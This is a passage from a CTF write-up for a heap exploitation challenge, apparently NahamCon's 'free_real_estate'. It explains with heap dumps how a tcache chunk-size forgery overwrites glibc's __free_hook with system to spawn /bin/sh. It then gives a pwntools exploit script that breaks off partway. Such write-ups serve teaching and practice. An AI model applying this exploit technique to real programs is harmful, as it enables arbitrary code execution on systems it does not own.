</span></span><span class="line"><span class="cl">0x55802d04d430	0x0000000000000000	0x000055802d04d010
</span></span><span class="line"><span class="cl">0x55802d04d440	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d450	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d460	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d470	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d480	0x0000000000000000	0x0000000000000061
</span></span><span class="line"><span class="cl">0x55802d04d490	0x00007fe1975c1e48	0x000055802d04000a	 &lt;-- tcachebins[0x60][0/2]
</span></span><span class="line"><span class="cl">0x55802d04d4a0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4b0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4c0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4e0	0x0000000000000000	0x0000000000000071
</span></span><span class="line"><span class="cl">0x55802d04d4f0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x70][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d500	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d510	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d520	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d530	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d540	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d550	0x0000000000000000	0x0000000000000261	 &lt;-- unsortedbin[all][0]
</span></span><span class="line"><span class="cl">0x55802d04d560	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x55802d04d7b0	0x0000000000000260	0x0000000000000030
</span></span><span class="line"><span class="cl">0x55802d04d7c0	0x000000006f616d6c	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next step would be we need to consecutively alloc 0x60 chunks. Okay, so now, let&rsquo;s call <code>edit_property</code> to change the street name.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">edit_property(r, 0x49, b&#39;a&#39;*0x8, 0)
</span></span></code></pre></td></tr></table>
</div>
</div><p>By doing that, now the bins will be like below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x60 [  1]: 0x7fe1975c1e48 (__free_hook) ‚óÇ‚Äî 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Also now, <code>street</code> and <code>comment</code> point to the same address (Because <code>comment</code> is a freed chunk, and during <code>street</code> call malloc, the <code>comment</code> chunk is used).</p>
<p>We are very close to solve this problem. Now, we need to do another malloc to be able overwrite the <code>__free_hook</code>. But unfortunately, both of the <code>street</code> and <code>comment</code> object size is already 0x60, and we can&rsquo;t malloc them without freeing the 0x60 chunk.
Here where <code>username</code> will take part. Remember that <code>change_username</code> is able to forge chunks located between <code>username</code> and <code>username+0x427</code>. And the <code>street</code> &amp; <code>comment</code> chunk (<code>0x000055802d04d490</code>) is located on there.
What we&rsquo;re going to do now is with <code>change_username</code>, forge the <code>0x000055802d04d490</code> chunk&rsquo;s size metadata to <code>0x51</code>, and then we&rsquo;re going to edit it to <code>0x61</code> with value the <code>system</code> address, so that we will:</p>
<ul>
<li>Free the forged chunk and put it inside 0x51 tcachebins instead of 0x61</li>
<li>Allocate 0x60 chunk (which mean <code>street</code>/<code>comment</code> will points to <code>__free_hook</code> now)</li>
<li>Allocated the <code>system</code> address to the <code>__free_hook</code> via <code>edit_property</code> by editing the <code>street</code>/<code>comment</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">change_username</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">31</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">))</span> <span class="c1"># Forge metadata of the chunk&#39;s size to 0x51</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># Reset the stored size value first</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># Instead of freeing the 0x60 chunk, it will free the 0x51 and malloc 0x60 chunk</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After the above code, we&rsquo;re finally overwrite the <code>__free_hook</code> with <code>system</code>. Now, we just need to change the <code>street</code> value to <code>/bin/sh\x00</code> and <code>free</code> it üòÑ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">),</span> <span class="mi">13</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">),</span> <span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally, we got the shell!</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/GhRc2WN.jpg"
        data-srcset="https://i.imgur.com/GhRc2WN.jpg, https://i.imgur.com/GhRc2WN.jpg 1.5x, https://i.imgur.com/GhRc2WN.jpg 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/GhRc2WN.jpg"
        title="https://i.imgur.com/GhRc2WN.jpg" /></p>
<h3 id="final-script">Final script</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./free_real_estate&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.31.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-2.31.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main_arena</span> <span class="o">=</span> <span class="mh">0x1ecb80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenge.nahamcon.com&#34;</span><span class="p">,</span> <span class="mi">32491</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">lsn</span><span class="p">,</span> <span class="n">sn</span><span class="p">,</span> <span class="n">lc</span><span class="p">,</span> <span class="n">comment</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the house number: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># Isn&#39;t useful. Just set any value.</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of the street name: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lsn</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the street name: &#39;</span><span class="p">,</span> <span class="n">sn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the price of the property?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># Isn&#39;t useful. Just set any value.</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">lc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of the comment?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the comment: &#39;</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">lsn</span><span class="p">,</span> <span class="n">sn</span><span class="p">,</span> <span class="n">lc</span><span class="p">,</span> <span class="n">comment</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">change_comment</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">is_free_hook_overwritted</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the house number? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span> <span class="c1"># Isn&#39;t useful. No need to edit.</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">lsn</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the street? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the street? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new street name length: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lsn</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new street name: &#39;</span><span class="p">,</span> <span class="n">sn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the price of the property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span> <span class="c1"># Isn&#39;t useful. No need to edit.</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">lc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the comment? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">change_comment</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to add a comment for this property? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of the comment?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the comment: &#39;</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Would you like to change the comment? [y/n]: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new comment length: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">lc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">is_free_hook_overwritted</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># No need to enter new comment, as we have overwritten it with system</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the new comment: &#39;</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show_property</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">comment</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># We only care the comment value</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">comment</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">change_username</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">ln</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is the length of your new name?: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ln</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your new name: &#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># After first connection, by default the binary will call malloc(0x40)</span>
